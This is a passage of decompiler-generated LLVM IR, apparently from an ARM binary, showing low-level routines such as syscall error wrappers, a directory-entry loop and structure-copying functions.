  %v2_13978 = icmp eq i32 %v1_13978, 0
  br i1 %v2_13978, label %dec_label_pc_13980, label %dec_label_pc_139b0

dec_label_pc_13980:                               ; preds = %dec_label_pc_13974
  store i32 20, i32* @r2, align 4
  %v2_13984 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13984, i32* @r0, align 4
  %v0_13988 = call i32 @function_11110()
  %v0_139b0.pre = load i32, i32* @r5, align 4
  %v0_139b8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_139b0

dec_label_pc_139b0:                               ; preds = %dec_label_pc_13974, %dec_label_pc_13954, %dec_label_pc_13980
  %v0_139b8 = phi i32 [ %arg3, %dec_label_pc_13974 ], [ %arg3, %dec_label_pc_13954 ], [ %v0_139b8.pre, %dec_label_pc_13980 ]
  %v0_139b4 = phi i32 [ %arg2, %dec_label_pc_13974 ], [ 0, %dec_label_pc_13954 ], [ %v2_13984, %dec_label_pc_13980 ]
  %v0_139b0 = phi i32 [ %arg1, %dec_label_pc_13974 ], [ %arg1, %dec_label_pc_13954 ], [ %v0_139b0.pre, %dec_label_pc_13980 ]
  %v4_139c0 = call i32 @function_13f10(i32 %v0_139b0, i32 %v0_139b4, i32 %v0_139b8, i32 8)
  store i32 %v3_13954, i32* @r4, align 4
  store i32 %v6_13954, i32* @r5, align 4
  ret i32 %v4_139c0

; uselistorder directives
  uselistorder label %dec_label_pc_139b0, { 2, 0, 1 }
}

define i32 @function_139d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_139d4:
  %v0_139d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_139d4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_139d4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_139d4, %bb
  %v0_139e8 = phi i32 [ %arg1, %dec_label_pc_139d4 ], [ 0, %bb ]
  ret i32 %v0_139e8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_139f4() local_unnamed_addr {
dec_label_pc_139f4:
  %v4_13a00 = load i32, i32* inttoptr (i32 124180 to i32*), align 4
  %v1_13a04 = inttoptr i32 %v4_13a00 to i32*
  %v2_13a04 = load i32, i32* %v1_13a04, align 4
  %v2_13a08 = icmp eq i32 %v2_13a04, 0
  br i1 %v2_13a08, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_139f4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_139f4, %bb
  %v1_13a10 = phi i32 [ %v2_13a04, %dec_label_pc_139f4 ], [ 4096, %bb ]
  ret i32 %v1_13a10

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_13a1c() local_unnamed_addr {
dec_label_pc_13a1c:
  %v1_13a2c = load i32, i32* @r0, align 4
  ret i32 %v1_13a2c
}

define i32 @function_13a30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13a30:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13a30 = load i32, i32* @r7, align 4
  store i32 %v3_13a30, i32* %stack_var_-8, align 4
  %v0_13a3c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13a3c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13a3c, -4095
  br i1 %tmp, label %dec_label_pc_13a5c, label %dec_label_pc_13a4c

dec_label_pc_13a4c:                               ; preds = %dec_label_pc_13a30
  %v0_13a4c = call i32 @function_11008()
  %v0_13a50 = load i32, i32* %r7.global-to-local, align 4
  %v1_13a50 = sub i32 0, %v0_13a50
  %v2_13a54 = inttoptr i32 %v0_13a4c to i32*
  store i32 %v1_13a50, i32* %v2_13a54, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13a5c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a5c

dec_label_pc_13a5c:                               ; preds = %dec_label_pc_13a30, %dec_label_pc_13a4c
  %v1_13a60 = phi i32 [ %v0_13a3c, %dec_label_pc_13a30 ], [ -1, %dec_label_pc_13a4c ]
  %v2_13a5c = phi i32 [ %v3_13a30, %dec_label_pc_13a30 ], [ %v2_13a5c.pre, %dec_label_pc_13a4c ]
  store i32 %v2_13a5c, i32* %r7.global-to-local, align 4
  ret i32 %v1_13a60

; uselistorder directives
  uselistorder i32 %v0_13a3c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a5c, { 1, 0 }
}

define i32 @function_13a64() local_unnamed_addr {
dec_label_pc_13a64:
  %v1_13a74 = load i32, i32* @r0, align 4
  ret i32 %v1_13a74
}

define i32 @function_13a78() local_unnamed_addr {
dec_label_pc_13a78:
  %v1_13a88 = load i32, i32* @r0, align 4
  ret i32 %v1_13a88
}

define i32 @function_13a8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13a8c:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_13a8c = load i32, i32* @r5, align 4
  %v18_13a8c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13abc, label %dec_label_pc_13aa8

dec_label_pc_13aa8:                               ; preds = %dec_label_pc_13a8c
  %v0_13aa8 = call i32 @function_11008()
  %v0_13aac = load i32, i32* @r5, align 4
  %v1_13aac = sub i32 0, %v0_13aac
  store i32 %v1_13aac, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  %v2_13ab4 = inttoptr i32 %v0_13aa8 to i32*
  store i32 %v1_13aac, i32* %v2_13ab4, align 4
  br label %dec_label_pc_13b10

dec_label_pc_13abc:                               ; preds = %dec_label_pc_13a8c
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13abc
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_13ac4 = add i32 %arg2, %arg1
  store i32 %v3_13ac4, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13abc, %bb
  %v1_13b004 = phi i32 [ %v18_13a8c, %dec_label_pc_13abc ], [ %v3_13ac4, %bb ]
  %v0_13afc2 = phi i32 [ 141, %dec_label_pc_13abc ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_13b10, label %dec_label_pc_13afc

dec_label_pc_13ad0:                               ; preds = %dec_label_pc_13afc
  %v1_13ad0 = add i32 %v0_13ad0, 8
  %v2_13ad0 = inttoptr i32 %v1_13ad0 to i16*
  %v3_13ad0 = load i16, i16* %v2_13ad0, align 2
  %v4_13ad0 = zext i16 %v3_13ad0 to i32
  %v2_13ad4 = add i32 %v4_13ad0, %v0_13ad0
  store i32 %v2_13ad4, i32* %r3.global-to-local, align 4
  %v1_13ad8 = add i32 %v2_13ad4, -1
  %v2_13ad8 = inttoptr i32 %v1_13ad8 to i8*
  %v3_13ad8 = load i8, i8* %v2_13ad8, align 1
  %v4_13ad8 = zext i8 %v3_13ad8 to i32
  store i32 %v4_13ad8, i32* @r4, align 4
  %v1_13adc = call i32 @function_15610(i32 %v1_13afc)
  %v0_13ae0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13ae0, i32* @r1, align 4
  %v1_13ae4 = add i32 %v1_13adc, 1
  store i32 %v1_13ae4, i32* @r2, align 4
  %v0_13ae8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13ae8, i32* @r0, align 4
  %v3_13aec = call i32 @function_11100(i32 %v0_13ae8, i32 %v0_13ae0, i32 %v1_13ae4)
  %v0_13af0 = load i32, i32* %r7.global-to-local, align 4
  %v1_13af0 = add i32 %v0_13af0, 8
  %v2_13af0 = inttoptr i32 %v1_13af0 to i16*
  %v3_13af0 = load i16, i16* %v2_13af0, align 2
  %v4_13af0 = zext i16 %v3_13af0 to i32
  store i32 %v4_13af0, i32* %r3.global-to-local, align 4
  %v0_13af4 = load i32, i32* @r4, align 4
  %v1_13af4 = trunc i32 %v0_13af4 to i8
  %v3_13af4 = add i32 %v0_13af0, 10
  %v4_13af4 = inttoptr i32 %v3_13af4 to i8*
  store i8 %v1_13af4, i8* %v4_13af4, align 1
  %v0_13af8 = load i32, i32* %r7.global-to-local, align 4
  %v1_13af8 = load i32, i32* %r3.global-to-local, align 4
  %v2_13af8 = add i32 %v1_13af8, %v0_13af8
  store i32 %v2_13af8, i32* %r7.global-to-local, align 4
  %v1_13b00.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13afc

dec_label_pc_13afc:                               ; preds = %.thread, %dec_label_pc_13ad0
  %v1_13b00 = phi i32 [ %v1_13b00.pre, %dec_label_pc_13ad0 ], [ %v1_13b004, %.thread ]
  %v0_13ad0 = phi i32 [ %v2_13af8, %dec_label_pc_13ad0 ], [ %v0_13afc2, %.thread ]
  %v1_13afc = add i32 %v0_13ad0, 10
  store i32 %v1_13afc, i32* %r6.global-to-local, align 4
  %v3_13b00 = icmp ult i32 %v0_13ad0, %v1_13b00
  %v1_13b08 = add i32 %v0_13ad0, 11
  store i32 %v1_13b08, i32* %r8.global-to-local, align 4
  br i1 %v3_13b00, label %dec_label_pc_13ad0, label %dec_label_pc_13b10

dec_label_pc_13b10:                               ; preds = %dec_label_pc_13afc, %.thread, %dec_label_pc_13aa8
  %v0_13b10 = load i32, i32* @r5, align 4
  store i32 %v6_13a8c, i32* @r5, align 4
  store i32 %v18_13a8c, i32* @sl, align 4
  ret i32 %v0_13b10

; uselistorder directives
  uselistorder i32 %v1_13afc, { 1, 0 }
  uselistorder i32 %v0_13ad0, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_13a8c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13afc, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13b20() local_unnamed_addr {
dec_label_pc_13b20:
  %r7.global-to-local = alloca i32, align 4
  %v0_13b28 = load i32, i32* @r1, align 4
  store i32 %v0_13b28, i32* @r3, align 4
  %v0_13b38 = load i32, i32* @r0, align 4
  store i32 %v0_13b38, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b38, -4095
  br i1 %tmp, label %dec_label_pc_13b58, label %dec_label_pc_13b44

dec_label_pc_13b44:                               ; preds = %dec_label_pc_13b20
  %v0_13b44 = call i32 @function_11008()
  %v0_13b48 = load i32, i32* %r7.global-to-local, align 4
  %v1_13b48 = sub i32 0, %v0_13b48
  store i32 %v1_13b48, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_13b50 = inttoptr i32 %v0_13b44 to i32*
  store i32 %v1_13b48, i32* %v2_13b50, align 4
  br label %dec_label_pc_13b68

dec_label_pc_13b58:                               ; preds = %dec_label_pc_13b20
  %v2_13b58 = icmp eq i32 %v0_13b38, 0
  br i1 %v2_13b58, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13b58
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13b58, %bb
  call void @__pseudo_cond_branch(i1 %v2_13b58, i32 ptrtoint (i32* @global_var_13d70.441 to i32))
  br label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %dec_label_pc_13b44, %.thread
  %v0_13b68 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_13b68

; uselistorder directives
  uselistorder i32 %v0_13b38, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13b68, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13b78(i32 %arg1) local_unnamed_addr {
dec_label_pc_13b78:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13b78 = load i32, i32* @r4, align 4
  store i32 %v3_13b78, i32* %stack_var_-16, align 4
  store i32 124088, i32* %r4.global-to-local, align 4
  %v4_13b88 = load i32, i32* @global_var_2077c.444, align 4
  %v2_13b8c = icmp eq i32 %v4_13b88, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13b8c, label %dec_label_pc_13b98, label %dec_label_pc_13ba8

dec_label_pc_13b98:                               ; preds = %dec_label_pc_13b78
  %v1_13b9c = call i32 @function_15b1c(i32 0)
  %v1_13ba0 = icmp slt i32 %v1_13b9c, 0
  br i1 %v1_13ba0, label %dec_label_pc_13bcc, label %dec_label_pc_13ba8thread-pre-split

dec_label_pc_13ba8thread-pre-split:               ; preds = %dec_label_pc_13b98
  %v0_13bac.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_13ba8.pre = load i32, i32* @global_var_2077c.444, align 4
  br label %dec_label_pc_13ba8

dec_label_pc_13ba8:                               ; preds = %dec_label_pc_13ba8thread-pre-split, %dec_label_pc_13b78
  %v0_13bb8 = phi i32 [ %v4_13ba8.pre, %dec_label_pc_13ba8thread-pre-split ], [ %v4_13b88, %dec_label_pc_13b78 ]
  %v1_13bbc = phi i32 [ %v0_13bac.pr, %dec_label_pc_13ba8thread-pre-split ], [ %arg1, %dec_label_pc_13b78 ]
  %v2_13bac = icmp eq i32 %v1_13bbc, 0
  store i32 %v0_13bb8, i32* %r4.global-to-local, align 4
  br i1 %v2_13bac, label %dec_label_pc_13bd0, label %dec_label_pc_13bb8

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13ba8
  %v2_13bbc = add i32 %v1_13bbc, %v0_13bb8
  %v1_13bc0 = call i32 @function_15b1c(i32 %v2_13bbc)
  %v1_13bc4 = icmp slt i32 %v1_13bc0, 0
  br i1 %v1_13bc4, label %dec_label_pc_13bcc, label %dec_label_pc_13bb8.dec_label_pc_13bd0_crit_edge

dec_label_pc_13bb8.dec_label_pc_13bd0_crit_edge:  ; preds = %dec_label_pc_13bb8
  %v0_13bd0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13bd0

dec_label_pc_13bcc:                               ; preds = %dec_label_pc_13bb8, %dec_label_pc_13b98
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13bd0

dec_label_pc_13bd0:                               ; preds = %dec_label_pc_13ba8, %dec_label_pc_13bb8.dec_label_pc_13bd0_crit_edge, %dec_label_pc_13bcc
  %v0_13bd0 = phi i32 [ %v0_13bd0.pre, %dec_label_pc_13bb8.dec_label_pc_13bd0_crit_edge ], [ -1, %dec_label_pc_13bcc ], [ %v0_13bb8, %dec_label_pc_13ba8 ]
  %v2_13bd4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13bd4, i32* @r4, align 4
  ret i32 %v0_13bd0

; uselistorder directives
  uselistorder i32 %v0_13bb8, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_15b1c, { 1, 0 }
  uselistorder label %dec_label_pc_13bd0, { 2, 1, 0 }
}

define i32 @function_13be4(i32 %arg1) local_unnamed_addr {
dec_label_pc_13be4:
  %v1_13bf4 = load i32, i32* @r0, align 4
  ret i32 %v1_13bf4
}

define i32 @function_13bf8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13bf8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13bf8 = load i32, i32* @r4, align 4
  store i32 %v3_13bf8, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_13c10 = inttoptr i32 %arg2 to i8*
  %v3_13c10 = call i32 @function_11060(i8* %v2_13c10, i32 0)
  %v2_13c14 = load i32, i32* %arg1, align 4
  store i32 %v2_13c14, i32* %r3.global-to-local, align 4
  %v3_13c14 = add i32 %tmp, 4
  %v4_13c14 = inttoptr i32 %v3_13c14 to i32*
  %v5_13c14 = load i32, i32* %v4_13c14, align 4
  store i32 %v5_13c14, i32* %r4.global-to-local, align 4
  %v0_13c18 = load i32, i32* %r5.global-to-local, align 4
  %v1_13c18 = inttoptr i32 %v0_13c18 to i32*
  store i32 %v2_13c14, i32* %v1_13c18, align 4
  %v3_13c18 = add i32 %v0_13c18, 4
  %v4_13c18 = inttoptr i32 %v3_13c18 to i32*
  %v5_13c18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13c18, i32* %v4_13c18, align 4
  %v0_13c1c = load i32, i32* %r6.global-to-local, align 4
  %v1_13c1c = add i32 %v0_13c1c, 12
  %v2_13c1c = inttoptr i32 %v1_13c1c to i32*
  %v3_13c1c = load i32, i32* %v2_13c1c, align 4
  %v1_13c20 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c20 = add i32 %v1_13c20, 12
  %v3_13c20 = inttoptr i32 %v2_13c20 to i32*
  store i32 %v3_13c1c, i32* %v3_13c20, align 4
  %v0_13c24 = load i32, i32* %r6.global-to-local, align 4
  %v1_13c24 = add i32 %v0_13c24, 96
  store i32 %v1_13c24, i32* %r3.global-to-local, align 4
  %v1_13c28 = inttoptr i32 %v1_13c24 to i32*
  %v2_13c28 = load i32, i32* %v1_13c28, align 4
  store i32 %v2_13c28, i32* %r3.global-to-local, align 4
  %v3_13c28 = add i32 %v0_13c24, 100
  %v4_13c28 = inttoptr i32 %v3_13c28 to i32*
  %v5_13c28 = load i32, i32* %v4_13c28, align 4
  store i32 %v5_13c28, i32* %r4.global-to-local, align 4
  %v1_13c2c = add i32 %v0_13c24, 56
  %v2_13c2c = inttoptr i32 %v1_13c2c to i32*
  %v3_13c2c = load i32, i32* %v2_13c2c, align 4
  store i32 %v3_13c2c, i32* %r2.global-to-local, align 4
  %v1_13c30 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c30 = add i32 %v1_13c30, 96
  %v3_13c30 = inttoptr i32 %v2_13c30 to i32*
  store i32 %v2_13c28, i32* %v3_13c30, align 4
  %v0_13c34 = load i32, i32* %r4.global-to-local, align 4
  %v1_13c34 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c34 = add i32 %v1_13c34, 100
  %v3_13c34 = inttoptr i32 %v2_13c34 to i32*
  store i32 %v0_13c34, i32* %v3_13c34, align 4
  %v0_13c38 = load i32, i32* %r6.global-to-local, align 4
  %v1_13c38 = add i32 %v0_13c38, 24
  store i32 %v1_13c38, i32* %ip.global-to-local, align 4
  %v1_13c3c = inttoptr i32 %v1_13c38 to i32*
  %v2_13c3c = load i32, i32* %v1_13c3c, align 4
  store i32 %v2_13c3c, i32* %ip.global-to-local, align 4
  %v3_13c3c = add i32 %v0_13c38, 28
  %v4_13c3c = inttoptr i32 %v3_13c3c to i32*
  %v5_13c3c = load i32, i32* %v4_13c3c, align 4
  store i32 %v5_13c3c, i32* %lr.global-to-local, align 4
  %v0_13c40 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c40 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c40 = add i32 %v1_13c40, 56
  %v3_13c40 = inttoptr i32 %v2_13c40 to i32*
  store i32 %v0_13c40, i32* %v3_13c40, align 4
  %v0_13c44 = load i32, i32* %r6.global-to-local, align 4
  %v1_13c44 = add i32 %v0_13c44, 72
  store i32 %v1_13c44, i32* %r3.global-to-local, align 4
  %v1_13c48 = add i32 %v0_13c44, 32
  store i32 %v1_13c48, i32* %r7.global-to-local, align 4
  %v1_13c4c = inttoptr i32 %v1_13c48 to i32*
  %v2_13c4c = load i32, i32* %v1_13c4c, align 4
  store i32 %v2_13c4c, i32* %r7.global-to-local, align 4
  %v3_13c4c = add i32 %v0_13c44, 36
  %v4_13c4c = inttoptr i32 %v3_13c4c to i32*
  %v5_13c4c = load i32, i32* %v4_13c4c, align 4
  store i32 %v5_13c4c, i32* %r8.global-to-local, align 4
  %v1_13c50 = inttoptr i32 %v1_13c44 to i32*
  %v2_13c50 = load i32, i32* %v1_13c50, align 4
  %v3_13c50 = add i32 %v0_13c44, 76
  %v4_13c50 = inttoptr i32 %v3_13c50 to i32*
  %v5_13c50 = load i32, i32* %v4_13c50, align 4
  store i32 %v5_13c50, i32* %r1.global-to-local, align 4
  %v0_13c54 = load i32, i32* %r5.global-to-local, align 4
  %v1_13c54 = add i32 %v0_13c54, 72
  %v1_13c58 = inttoptr i32 %v1_13c54 to i32*
  store i32 %v2_13c50, i32* %v1_13c58, align 4
  %v3_13c58 = add i32 %v0_13c54, 76
  %v4_13c58 = inttoptr i32 %v3_13c58 to i32*
  %v5_13c58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13c58, i32* %v4_13c58, align 4
  %v0_13c5c = load i32, i32* %r7.global-to-local, align 4
  %v1_13c5c = load i32, i32* %r5.global-to-local, align 4
  %v2_13c5c = add i32 %v1_13c5c, 32
  %v3_13c5c = inttoptr i32 %v2_13c5c to i32*
  store i32 %v0_13c5c, i32* %v3_13c5c, align 4
  %v0_13c60 = load i32, i32* %r8.global-to-local, align 4
  %v1_13c60 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c60 = add i32 %v1_13c60, 36
  %v3_13c60 = inttoptr i32 %v2_13c60 to i32*
  store i32 %v0_13c60, i32* %v3_13c60, align 4
  %v0_13c64 = load i32, i32* %r6.global-to-local, align 4
  %v1_13c64 = add i32 %v0_13c64, 80
  store i32 %v1_13c64, i32* %r3.global-to-local, align 4
  %v1_13c68 = add i32 %v0_13c64, 48
  store i32 %v1_13c68, i32* %r7.global-to-local, align 4
  %v1_13c6c = inttoptr i32 %v1_13c68 to i32*
  %v2_13c6c = load i32, i32* %v1_13c6c, align 4
  store i32 %v2_13c6c, i32* %r7.global-to-local, align 4
  %v3_13c6c = add i32 %v0_13c64, 52
  %v4_13c6c = inttoptr i32 %v3_13c6c to i32*
  %v5_13c6c = load i32, i32* %v4_13c6c, align 4
  store i32 %v5_13c6c, i32* %r8.global-to-local, align 4
  %v1_13c70 = inttoptr i32 %v1_13c64 to i32*
  %v2_13c70 = load i32, i32* %v1_13c70, align 4
  %v3_13c70 = add i32 %v0_13c64, 84
  %v4_13c70 = inttoptr i32 %v3_13c70 to i32*
  %v5_13c70 = load i32, i32* %v4_13c70, align 4
  store i32 %v5_13c70, i32* %r1.global-to-local, align 4
  %v1_13c74 = add i32 %v0_13c64, 16
  %v2_13c74 = inttoptr i32 %v1_13c74 to i32*
  %v3_13c74 = load i32, i32* %v2_13c74, align 4
  store i32 %v3_13c74, i32* %r2.global-to-local, align 4
  %v0_13c78 = load i32, i32* %r5.global-to-local, align 4
  %v1_13c78 = add i32 %v0_13c78, 80
  %v1_13c7c = inttoptr i32 %v1_13c78 to i32*
  store i32 %v2_13c70, i32* %v1_13c7c, align 4
  %v3_13c7c = add i32 %v0_13c78, 84
  %v4_13c7c = inttoptr i32 %v3_13c7c to i32*
  %v5_13c7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13c7c, i32* %v4_13c7c, align 4
  %v0_13c80 = load i32, i32* %r7.global-to-local, align 4
  %v1_13c80 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c80 = add i32 %v1_13c80, 48
  %v3_13c80 = inttoptr i32 %v2_13c80 to i32*
  store i32 %v0_13c80, i32* %v3_13c80, align 4
  %v0_13c84 = load i32, i32* %r8.global-to-local, align 4
  %v1_13c84 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c84 = add i32 %v1_13c84, 52
  %v3_13c84 = inttoptr i32 %v2_13c84 to i32*
  store i32 %v0_13c84, i32* %v3_13c84, align 4
  %v0_13c88 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c88 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c88 = add i32 %v1_13c88, 16
  %v3_13c88 = inttoptr i32 %v2_13c88 to i32*
  store i32 %v0_13c88, i32* %v3_13c88, align 4
  %v0_13c8c = load i32, i32* %r6.global-to-local, align 4
  %v1_13c8c = add i32 %v0_13c8c, 88
  store i32 %v1_13c8c, i32* %r3.global-to-local, align 4
  %v1_13c90 = add i32 %v0_13c8c, 20
  %v2_13c90 = inttoptr i32 %v1_13c90 to i32*
  %v3_13c90 = load i32, i32* %v2_13c90, align 4
  store i32 %v3_13c90, i32* %r2.global-to-local, align 4
  %v1_13c94 = inttoptr i32 %v1_13c8c to i32*
  %v2_13c94 = load i32, i32* %v1_13c94, align 4
  %v3_13c94 = add i32 %v0_13c8c, 92
  %v4_13c94 = inttoptr i32 %v3_13c94 to i32*
  %v5_13c94 = load i32, i32* %v4_13c94, align 4
  store i32 %v5_13c94, i32* %r1.global-to-local, align 4
  %v1_13c98 = add i32 %v0_13c8c, 64
  store i32 %v1_13c98, i32* %r6.global-to-local, align 4
  %v1_13c9c = inttoptr i32 %v1_13c98 to i32*
  %v2_13c9c = load i32, i32* %v1_13c9c, align 4
  store i32 %v2_13c9c, i32* %r6.global-to-local, align 4
  %v3_13c9c = add i32 %v0_13c8c, 68
  %v4_13c9c = inttoptr i32 %v3_13c9c to i32*
  %v5_13c9c = load i32, i32* %v4_13c9c, align 4
  store i32 %v5_13c9c, i32* %r7.global-to-local, align 4
  %v0_13ca0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ca0 = add i32 %v0_13ca0, 88
  store i32 %v1_13ca0, i32* %r3.global-to-local, align 4
  %v2_13ca4 = add i32 %v0_13ca0, 20
  %v3_13ca4 = inttoptr i32 %v2_13ca4 to i32*
  store i32 %v3_13c90, i32* %v3_13ca4, align 4
  %v0_13ca8 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ca8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ca8 = add i32 %v1_13ca8, 24
  %v3_13ca8 = inttoptr i32 %v2_13ca8 to i32*
  store i32 %v0_13ca8, i32* %v3_13ca8, align 4
  %v0_13cac = load i32, i32* %lr.global-to-local, align 4
  %v1_13cac = load i32, i32* %r5.global-to-local, align 4
  %v2_13cac = add i32 %v1_13cac, 28
  %v3_13cac = inttoptr i32 %v2_13cac to i32*
  store i32 %v0_13cac, i32* %v3_13cac, align 4
  %v0_13cb0 = load i32, i32* %r6.global-to-local, align 4
  %v1_13cb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_13cb0 = add i32 %v1_13cb0, 64
  %v3_13cb0 = inttoptr i32 %v2_13cb0 to i32*
  store i32 %v0_13cb0, i32* %v3_13cb0, align 4
  %v0_13cb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_13cb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13cb4 = add i32 %v1_13cb4, 68
  %v3_13cb4 = inttoptr i32 %v2_13cb4 to i32*
  store i32 %v0_13cb4, i32* %v3_13cb4, align 4
  %v0_13cb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_13cb8 = inttoptr i32 %v0_13cb8 to i32*
  store i32 %v2_13c94, i32* %v1_13cb8, align 4
  %v3_13cb8 = add i32 %v0_13cb8, 4
  %v4_13cb8 = inttoptr i32 %v3_13cb8 to i32*
  %v5_13cb8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13cb8, i32* %v4_13cb8, align 4
  %v2_13cbc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13cbc, i32* %r4.global-to-local, align 4
  ret i32 %v2_13c94

; uselistorder directives
  uselistorder i32 %v0_13c8c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_13c64, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 1, 0, 2 }
  uselistorder i32 104, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_13cc4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13cc4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13cc4 = load i32, i32* @r4, align 4
  store i32 %v3_13cc4, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_13cdc = inttoptr i32 %arg2 to i8*
  %v3_13cdc = call i32 @function_11060(i8* %v2_13cdc, i32 0)
